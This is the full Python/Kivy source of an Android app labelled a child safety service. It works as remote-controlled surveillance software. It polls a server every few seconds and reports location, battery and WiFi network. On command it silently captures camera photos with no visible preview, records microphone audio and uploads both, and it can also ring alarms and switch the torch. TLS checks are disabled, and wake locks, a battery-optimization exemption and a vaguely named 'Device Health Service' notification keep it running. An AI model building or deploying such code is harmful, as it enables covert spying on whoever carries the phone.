import os
import sys
import json
import datetime
import requests
import uuid
import threading
import urllib3

# Android SSL certificate warnings suppress
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from kivy.app import App
from kivy.clock import Clock
from kivy.utils import platform
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput

# ================= Configuration Management =================
DEFAULT_SERVER_URL = "https://device-update.onrender.com"
CONFIG_FILE = "child_config.json"

def get_android_device_id():
    """Android Unique Hardware ID - avoids duplicate device entries"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Settings = autoclass('android.provider.Settings')
            context = PythonActivity.mActivity.getApplicationContext()
            aid = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)
            if aid and str(aid).strip():
                return str(aid).strip()[:16]
        except Exception as e:
            print("[DEVICE ID ERROR]", e)
    return str(uuid.getnode())[:16]

def get_android_device_name():
    """Auto-detect phone name or model (e.g. 'Rahul Phone' or 'Xiaomi Redmi 9')"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Settings = autoclass('android.provider.Settings')
            Build = autoclass('android.os.Build')
            context = PythonActivity.mActivity.getApplicationContext()
            cr = context.getContentResolver()

            # 1. User-assigned phone name
            dev_name = None
            try:
                dev_name = Settings.Global.getString(cr, "device_name")
            except Exception:
                pass

            # 2. Bluetooth device name
            if not dev_name:
                try:
                    dev_name = Settings.Secure.getString(cr, "bluetooth_name")
                except Exception:
                    pass

            # 3. Hardware Brand + Model
            if not dev_name:
                mfg = str(Build.MANUFACTURER).capitalize()
                model = str(Build.MODEL)
                if model.lower().startswith(mfg.lower()):
                    dev_name = model
                else:
                    dev_name = f"{mfg} {model}"

            if dev_name and dev_name.strip():
                return dev_name.strip()
        except Exception as e:
            print("[AUTO DEVICE NAME ERROR]", e)
    return "Child_Mobile_Phone"

def get_android_location():
    """Fetch location directly via Android LocationManager (GPS + Network)"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            LocationManager = autoclass('android.location.LocationManager')

            activity = PythonActivity.mActivity
            lm = activity.getApplicationContext().getSystemService(Context.LOCATION_SERVICE)

            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if not loc:
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if not loc:
                loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if loc:
                lat = float(loc.getLatitude())
                lon = float(loc.getLongitude())
                acc = float(loc.getAccuracy())
                return lat, lon, acc
        except Exception as e:
            print("[LOCATION MANAGER ERROR]", e)
    return None

def load_config():
    auto_name = get_android_device_name()
    persistent_id = get_android_device_id()
    default_cfg = {
        "server_url": DEFAULT_SERVER_URL,
        "child_name": auto_name,
        "device_id": persistent_id,
        "poll_interval": 5,
        "is_configured": True
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                saved = json.load(f)
                if not saved.get("server_url") or "127.0.0.1" in str(saved.get("server_url")):
                    saved["server_url"] = DEFAULT_SERVER_URL
                if not saved.get("child_name") or saved.get("child_name") in ["Child_Mobile", "Child_Mobile_Device", "Child_Mobile_Phone"]:
                    saved["child_name"] = auto_name
                if not saved.get("device_id"):
                    saved["device_id"] = persistent_id
                return saved
        except Exception:
            pass
    return default_cfg

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=4)
    except Exception as e:
        print("[CONFIG SAVE ERROR]", e)

# ================= Android Hardware Wrappers =================

def request_ignore_battery_optimizations():
    if platform == 'android':
        try:
            from jnius import autoclass
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity

            package_name = activity.getPackageName()
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse("package:" + package_name))
            activity.startActivity(intent)
            return True
        except Exception as e:
            print("[BATTERY POPUP ERROR]", e)
    return False

def get_android_battery():
    if platform == 'android':
        try:
            from jnius import autoclass
            Intent = autoclass('android.content.Intent')
            IntentFilter = autoclass('android.content.IntentFilter')
            BatteryManager = autoclass('android.os.BatteryManager')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')

            context = PythonActivity.mActivity.getApplicationContext()
            ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            battery_status = context.registerReceiver(None, ifilter)

            level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            status = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)

            battery_pct = int((level / float(scale)) * 100) if scale > 0 else 100
            is_charging = status == BatteryManager.BATTERY_STATUS_CHARGING or status == BatteryManager.BATTERY_STATUS_FULL
            return battery_pct, is_charging
        except Exception as e:
            print("[BATTERY ERROR]", e)
    return 95, False

def get_android_wifi_ssid():
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            activity = PythonActivity.mActivity
            wifi_manager = activity.getApplicationContext().getSystemService(Context.WIFI_SERVICE)
            info = wifi_manager.getConnectionInfo()
            if info:
                ssid = info.getSSID().replace('"', '')
                if ssid and ssid != "<unknown ssid>":
                    return ssid
        except Exception as e:
            print("[WIFI ERROR]", e)
    return "Mobile_Data"

def acquire_wake_lock():
    """Keep CPU active in background when screen turns off"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')
            
            activity = PythonActivity.mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildMonitor::KeepAliveLock")
            wake_lock.acquire()
            return wake_lock
        except Exception as e:
            print("[WAKELOCK ERROR]", e)
    return None

def start_foreground_notification():
    """Show persistent notification to prevent Android OS from killing the app"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            Notification = autoclass('android.app.Notification')
            NotificationManager = autoclass('android.app.NotificationManager')
            NotificationChannel = autoclass('android.app.NotificationChannel')
            BuildVERSION = autoclass('android.os.Build$VERSION')
            
            activity = PythonActivity.mActivity
            context = activity.getApplicationContext()
            nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
            
            channel_id = "device_health_service"
            if BuildVERSION.SDK_INT >= 26:
                channel = NotificationChannel(channel_id, "Device Health Service", NotificationManager.IMPORTANCE_LOW)
                channel.setDescription("Child safety monitoring active")
                nm.createNotificationChannel(channel)
                builder = Notification.Builder(context, channel_id)
            else:
                builder = Notification.Builder(context)
                
            builder.setContentTitle("Device Health Service")
            builder.setContentText("Child safety service is active in background.")
            builder.setSmallIcon(context.getApplicationInfo().icon)
            builder.setOngoing(True)
            
            nm.notify(1001, builder.build())
        except Exception as e:
            print("[NOTIFICATION ERROR]", e)

# ================= Main Application =================

class ChildMonitorApp(App):
    def build(self):
        self.title = "Device Health & Safety Service"
        self.config_data = load_config()
        self.server_url = self.config_data.get("server_url", DEFAULT_SERVER_URL).strip()
        self.child_name = self.config_data.get("child_name", get_android_device_name())
        self.device_id = self.config_data.get("device_id", get_android_device_id())
        self.current_lat = 19.0760
        self.current_lon = 72.8777
        self.connection_status = "Connecting..."
        self.wake_lock = None
        self._is_capturing_camera = False
        self._audio_recorder = None
        self._audio_output_path = None

        self.root_layout = BoxLayout(orientation='vertical')

        # Main active UI screen
        self.show_active_monitoring_screen()

        # 1. WakeLock and Background Notification
        self.wake_lock = acquire_wake_lock()
        start_foreground_notification()

        # 2. Permissions and GPS initialization
        self.request_android_permissions()
        self.init_gps()

        # 3. Prompt battery optimization on launch
        Clock.schedule_once(lambda dt: request_ignore_battery_optimizations(), 2)

        # 4. Fast Background Polling (Every 5 seconds for instant response!)
        Clock.schedule_once(lambda dt: self.start_bg_poll(), 1)
        Clock.schedule_interval(lambda dt: self.start_bg_poll(), 5)

        return self.root_layout

    def on_pause(self):
        """Keep running continuously when minimized or screen locked"""
        return True

    def on_resume(self):
        pass

    # -------- Main Screen --------
    def show_active_monitoring_screen(self):
        self.root_layout.clear_widgets()

        active_box = BoxLayout(orientation='vertical', padding=20, spacing=15)

        self.title_label = Label(
            text="Child Safety & Health Service\n(Active in Background)",
            font_size='18sp',
            bold=True,
            halign='center',
            size_hint=(1, 0.20)
        )
        active_box.add_widget(self.title_label)

        # Emergency SOS Button
        self.sos_btn = Button(
            text="EMERGENCY SOS\n(Press for Help)",
            font_size='22sp',
            bold=True,
            background_color=(0.9, 0.15, 0.15, 1),
            size_hint=(1, 0.45)
        )
        self.sos_btn.bind(on_press=self.trigger_sos_alert)
        active_box.add_widget(self.sos_btn)

        self.info_label = Label(
            text=f"Device: {self.child_name}\nStatus: {self.connection_status}\nServer: {self.server_url}",
            font_size='13sp',
            color=(0.85, 0.85, 0.85, 1),
            halign='center',
            size_hint=(1, 0.23)
        )
        active_box.add_widget(self.info_label)

        btn_settings = Button(
            text="Settings",
            font_size='14sp',
            background_color=(0.25, 0.35, 0.45, 1),
            size_hint=(1, 0.12)
        )
        btn_settings.bind(on_press=lambda x: self.show_setup_screen())
        active_box.add_widget(btn_settings)

        self.root_layout.add_widget(active_box)

    # -------- Settings Screen --------
    def show_setup_screen(self):
        self.root_layout.clear_widgets()

        setup_box = BoxLayout(orientation='vertical', padding=25, spacing=12)

        title = Label(
            text="Settings",
            font_size='19sp',
            bold=True,
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(title)

        lbl_url = Label(text="Server URL:", font_size='13sp', size_hint=(1, 0.08))
        setup_box.add_widget(lbl_url)

        self.input_url = TextInput(
            text=self.server_url,
            multiline=False,
            font_size='15sp',
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(self.input_url)

        lbl_name = Label(text="Device / Child Name:", font_size='13sp', size_hint=(1, 0.08))
        setup_box.add_widget(lbl_name)

        self.input_name = TextInput(
            text=self.child_name,
            multiline=False,
            font_size='15sp',
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(self.input_name)

        btn_battery = Button(
            text="Disable Battery Optimization",
            font_size='13sp',
            background_color=(0.2, 0.6, 0.9, 1),
            size_hint=(1, 0.14)
        )
        btn_battery.bind(on_press=lambda x: request_ignore_battery_optimizations())
        setup_box.add_widget(btn_battery)

        btn_save = Button(
            text="SAVE & RECONNECT",
            font_size='16sp',
            bold=True,
            background_color=(0.1, 0.75, 0.3, 1),
            size_hint=(1, 0.16)
        )
        btn_save.bind(on_press=self.save_and_start)
        setup_box.add_widget(btn_save)

        self.root_layout.add_widget(setup_box)

    def save_and_start(self, instance):
        raw_url = self.input_url.text.strip()
        name = self.input_name.text.strip()

        if raw_url:
            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                raw_url = "https://" + raw_url
            raw_url = raw_url.rstrip("/")
            self.server_url = raw_url
            self.config_data["server_url"] = raw_url

        if name:
            self.child_name = name
            self.config_data["child_name"] = name

        save_config(self.config_data)
        self.show_active_monitoring_screen()
        Clock.schedule_once(lambda dt: self.start_bg_poll(), 1)

    # -------- Permissions & GPS --------
    def request_android_permissions(self):
        if platform == 'android':
            try:
                from android.permissions import Permission, request_permissions
                permissions = [
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_COARSE_LOCATION,
                    Permission.CAMERA,
                    Permission.RECORD_AUDIO,
                    Permission.READ_PHONE_STATE
                ]
                request_permissions(permissions)
            except Exception as e:
                print("[PERMISSIONS ERROR]", e)

    def init_gps(self):
        if platform == 'android':
            try:
                from plyer import gps
                gps.configure(on_location=self.on_location_received)
                gps.start(minTime=5000, minDistance=3)
            except Exception as e:
                print("[GPS INIT ERROR]", e)

    def on_location_received(self, **kwargs):
        self.current_lat = kwargs.get('lat', self.current_lat)
        self.current_lon = kwargs.get('lon', self.current_lon)

    # -------- Fast Background Polling (Every 5 seconds) --------
    def start_bg_poll(self):
        t = threading.Thread(target=self._worker_cycle, daemon=True)
        t.start()

    def _worker_cycle(self):
        if not self.server_url:
            return

        url = f"{self.server_url}/get_commands/{self.device_id}"
        battery, is_charging = get_android_battery()
        wifi_ssid = get_android_wifi_ssid()

        payload = {
            "child_name": self.child_name,
            "battery_level": battery,
            "is_charging": is_charging,
            "wifi_ssid": wifi_ssid
        }

        try:
            response = requests.post(url, json=payload, timeout=8, verify=False)
            if response.status_code == 200:
                self.connection_status = "Online (Connected)"
                commands = response.json()

                # 1. Send GPS Location
                if commands.get("location_access", True):
                    self.send_location_bg()

                # 2. Camera Capture Command
                camera_mode = commands.get("camera_access")
                if camera_mode in ["FRONT", "BACK"] and not self._is_capturing_camera:
                    Clock.schedule_once(lambda dt: self.capture_camera(camera_mode), 0)

                # 3. Audio Recording Start & Stop Control
                audio_state = commands.get("audio_record_state", "IDLE")
                if audio_state == "START":
                    Clock.schedule_once(lambda dt: self.start_audio_recording(), 0)
                elif audio_state == "STOP":
                    Clock.schedule_once(lambda dt: self.stop_and_upload_audio(), 0)

                # 4. Ring Alarm
                if commands.get("ring_alarm") is True:
                    self.play_remote_alarm(True)
                else:
                    self.play_remote_alarm(False)

                # 5. Torch / Flashlight
                self.set_torch(commands.get("torch_access", False))

            else:
                self.connection_status = f"Server Error {response.status_code}"

        except Exception as e:
            self.connection_status = "Reconnecting..."

        Clock.schedule_once(lambda dt: self._update_ui_status(battery, wifi_ssid), 0)

    def _update_ui_status(self, battery, wifi_ssid):
        if hasattr(self, 'info_label'):
            self.info_label.text = (
                f"Device: {self.child_name}\n"
                f"Status: {self.connection_status}\n"
                f"Battery: {battery}% | Network: {wifi_ssid}\n"
                f"Server: {self.server_url}"
            )

    def send_location_bg(self):
        loc_info = get_android_location()
        if loc_info:
            self.current_lat, self.current_lon, accuracy = loc_info
        else:
            accuracy = 8.0

        try:
            url = f"{self.server_url}/update_location"
            payload = {
                "child_id": self.device_id,
                "latitude": self.current_lat,
                "longitude": self.current_lon,
                "accuracy": accuracy,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            requests.post(url, json=payload, timeout=8, verify=False)
        except Exception as e:
            print("[LOCATION SEND ERROR]", e)

    def trigger_sos_alert(self, instance):
        self.title_label.text = "EMERGENCY SOS SENT!\nParents have been notified."
        t = threading.Thread(target=self._send_sos_worker, daemon=True)
        t.start()

    def _send_sos_worker(self):
        loc_info = get_android_location()
        if loc_info:
            self.current_lat, self.current_lon, _ = loc_info

        try:
            url = f"{self.server_url}/trigger_sos"
            payload = {
                "child_id": self.device_id,
                "latitude": self.current_lat,
                "longitude": self.current_lon
            }
            requests.post(url, json=payload, timeout=8, verify=False)
            self.send_location_bg()
        except Exception as e:
            print("[SOS ERROR]", e)

    # -------- Robust Camera Capture for Android (Xiaomi / Samsung / etc.) --------

    def capture_camera(self, mode):
        if platform != 'android' or self._is_capturing_camera:
            return

        self._is_capturing_camera = True
        try:
            from jnius import autoclass, java_method, PythonJavaClass
            Camera = autoclass('android.hardware.Camera')
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            SurfaceTexture = autoclass('android.graphics.SurfaceTexture')

            num_cams = Camera.getNumberOfCameras()
            target_cam_id = 0
            info = CameraInfo()
            for i in range(num_cams):
                Camera.getCameraInfo(i, info)
                if mode == 'FRONT' and info.facing == CameraInfo.CAMERA_FACING_FRONT:
                    target_cam_id = i
                    break
                elif mode == 'BACK' and info.facing == CameraInfo.CAMERA_FACING_BACK:
                    target_cam_id = i
                    break

            class PictureCallback(PythonJavaClass):
                __javainterfaces__ = ['android/hardware/Camera$PictureCallback']

                def __init__(self, upload_func, finish_func):
                    super().__init__()
                    self.upload_func = upload_func
                    self.finish_func = finish_func

                @java_method('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, camera):
                    try:
                        if data:
                            self.upload_func(bytes(data))
                    finally:
                        try:
                            camera.stopPreview()
                            camera.release()
                        except Exception:
                            pass
                        self.finish_func()

            def finish_capture():
                self._is_capturing_camera = False

            def do_upload(image_bytes):
                def upload_task():
                    try:
                        url = f"{self.server_url}/upload_camera_photo"
                        filename = f"{mode.lower()}_capture_{int(datetime.datetime.now().timestamp())}.jpg"
                        files = {"image": (filename, image_bytes, "image/jpeg")}
                        data = {"child_id": self.device_id}
                        requests.post(url, data=data, files=files, timeout=15, verify=False)
                        print(f"[CAMERA] {mode} photo uploaded successfully!")
                    except Exception as err:
                        print("[CAMERA UPLOAD ERROR]", err)
                threading.Thread(target=upload_task, daemon=True).start()

            cam = Camera.open(target_cam_id)
            dummy_texture = SurfaceTexture(0)
            cam.setPreviewTexture(dummy_texture)

            # Set optimal snapshot resolution for fast capture & fast upload
            params = cam.getParameters()
            sizes = params.getSupportedPictureSizes()
            if sizes and sizes.size() > 0:
                best_size = sizes.get(0)
                for s_idx in range(sizes.size()):
                    s = sizes.get(s_idx)
                    if s.width <= 1920 and s.width >= 640:
                        best_size = s
                        break
                params.setPictureSize(best_size.width, best_size.height)
            cam.setParameters(params)
            cam.startPreview()

            # Half second delay to let sensor adjust exposure & frame buffer
            cb = PictureCallback(do_upload, finish_capture)
            Clock.schedule_once(lambda dt: self._execute_take_picture(cam, cb), 0.5)

        except Exception as e:
            print("[CAMERA CAPTURE ERROR]", e)
            self._is_capturing_camera = False

    def _execute_take_picture(self, cam, cb):
        try:
            cam.takePicture(None, None, cb)
        except Exception as e:
            print("[TAKE PICTURE ERROR]", e)
            self._is_capturing_camera = False
            try:
                cam.stopPreview()
                cam.release()
            except Exception:
                pass

    # -------- Audio Recording (Start & Stop Control) --------

    def start_audio_recording(self):
        if platform != 'android' or self._audio_recorder is not None:
            return

        try:
            from jnius import autoclass
            MediaRecorder = autoclass('android.media.MediaRecorder')
            AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
            OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
            AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

            self._audio_output_path = os.path.join(self.user_data_dir, f"voice_{int(datetime.datetime.now().timestamp())}.m4a")

            recorder = MediaRecorder()
            recorder.setAudioSource(AudioSource.MIC)
            recorder.setOutputFormat(OutputFormat.MPEG_4)
            recorder.setAudioEncoder(AudioEncoder.AAC)
            recorder.setOutputFile(self._audio_output_path)
            recorder.prepare()
            recorder.start()
            self._audio_recorder = recorder
            print("[AUDIO] Recording started...")
        except Exception as e:
            print("[AUDIO START ERROR]", e)
            self._audio_recorder = None

    def stop_and_upload_audio(self):
        if self._audio_recorder is None:
            return

        try:
            rec = self._audio_recorder
            self._audio_recorder = None
            out_file = self._audio_output_path

            rec.stop()
            rec.release()
            print("[AUDIO] Recording stopped. Uploading to server...")

            def upload_audio_worker():
                try:
                    if out_file and os.path.exists(out_file):
                        with open(out_file, "rb") as f:
                            filename = os.path.basename(out_file)
                            files = {"audio": (filename, f, "audio/mp4")}
                            data = {"child_id": self.device_id}
                            requests.post(f"{self.server_url}/upload_audio", data=data, files=files, timeout=20, verify=False)
                        print("[AUDIO] Audio clip uploaded successfully!")
                except Exception as e:
                    print("[AUDIO UPLOAD ERROR]", e)
            threading.Thread(target=upload_audio_worker, daemon=True).start()

        except Exception as e:
            print("[AUDIO STOP ERROR]", e)
            self._audio_recorder = None

    def play_remote_alarm(self, should_play):
        if platform == 'android':
            try:
                from jnius import autoclass
                RingtoneManager = autoclass('android.media.RingtoneManager')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                context = PythonActivity.mActivity.getApplicationContext()

                if should_play and not hasattr(self, '_ringtone_obj'):
                    uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                    if not uri:
                        uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                    self._ringtone_obj = RingtoneManager.getRingtone(context, uri)
                    if self._ringtone_obj:
                        self._ringtone_obj.play()
                elif not should_play and hasattr(self, '_ringtone_obj'):
                    if self._ringtone_obj and self._ringtone_obj.isPlaying():
                        self._ringtone_obj.stop()
                    del self._ringtone_obj
            except Exception as e:
                print("[ALARM ERROR]", e)

    def set_torch(self, enable):
        if platform == 'android':
            try:
                from jnius import autoclass
                CameraManager = autoclass('android.hardware.camera2.CameraManager')
                Context = autoclass('android.content.Context')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                cm = activity.getSystemService(Context.CAMERA_SERVICE)
                cam_ids = cm.getCameraIdList()
                if cam_ids and len(cam_ids) > 0:
                    cm.setTorchMode(cam_ids[0], bool(enable))
            except Exception as e:
                pass

if __name__ == '__main__':
    ChildMonitorApp().run()
